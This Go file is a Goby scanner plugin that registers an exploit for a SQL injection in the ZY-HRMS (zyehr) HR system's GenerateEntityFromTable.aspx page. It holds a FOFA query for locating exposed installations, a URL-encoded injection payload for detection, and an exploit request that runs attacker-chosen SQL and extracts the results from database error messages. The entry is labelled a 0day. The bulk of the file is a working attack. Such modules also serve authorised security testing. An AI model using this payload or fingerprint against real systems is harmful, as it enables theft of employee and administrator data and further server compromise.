package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "zyehr GenerateEntityFromTable.aspx SQL Injection",
    "Description": "<p>zyehr is based on B/S web-side WAN platform, a set of attendance system can manage and control multiple branches all over the country in a unified way, and the cost is lower. Information sharing is faster. Cross-platform, cross-electronic device. The system has a SQL injection vulnerability, through which an attacker can gain database privileges.</p>",
    "Product": "ZY-HRMS",
    "Homepage": "http://www.zyehr.com",
    "DisclosureDate": "2022-04-21",
    "Author": "black@blackhat.net",
    "FofaQuery": "body=\"ZY.LOGO.64.png\"",
    "GobyQuery": "body=\"ZY.LOGO.64.png\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.zyehr.com\">http://www.zyehr.com</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "user,db_name(),@@version",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select%20SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%271230%27)),3,32)))%2B%27",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "4122cb13c7a474c1976c9706ae36521d",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select+{{{sql}}}))%2B%27",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|值 '(.*?)' 转换成数据类型"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "智跃人力资源管理系统 GenerateEntityFromTable.aspx SQL注入漏洞",
            "Product": "ZY-人力资源管理系统",
            "Description": "<p>智跃人力资源管理系统是基于B/S网页端广域网平台，一套考勤系统即可对全国各地多个分公司进行统一管控，成本更低。信息共享更快。跨平台，跨电子设备。该系统存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.zyehr.com\" rel=\"nofollow\">http://www.zyehr.com</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "zyehr GenerateEntityFromTable.aspx SQL Injection",
            "Product": "ZY-HRMS",
            "Description": "<p>zyehr is based on B/S web-side WAN platform, a set of attendance system can manage and control multiple branches all over the country in a unified way, and the cost is lower. Information sharing is faster. Cross-platform, cross-electronic device. The system has a SQL injection vulnerability, through which an attacker can gain database privileges.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.zyehr.com\" rel=\"nofollow\">http://www.zyehr.com</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
